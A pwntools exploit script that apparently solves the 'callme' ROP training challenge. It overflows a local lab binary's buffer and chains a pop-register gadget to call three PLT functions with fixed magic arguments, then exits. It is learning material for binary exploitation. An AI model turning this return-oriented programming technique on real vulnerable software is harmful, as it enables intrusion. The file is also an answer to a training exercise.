from pwn import *

proc = process("./callme")

payload = b'0' * 40

payload += p64(0x000000000040093c) # 0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x0000000000400720) # plt:0000000000400720 _callme_one

payload += p64(0x000000000040093c) # 0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x0000000000400740) # .plt:0000000000400740 _callme_two

payload += p64(0x000000000040093c) # 0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x00000000004006F0) # .plt:00000000004006F0 _callme_three

# .text:0000000000400932                 mov     edi, 1          ; status
# .text:0000000000400937                 call    _exit
payload += p64(0x0000000000400932)

proc.sendline(payload)
proc.interactive()
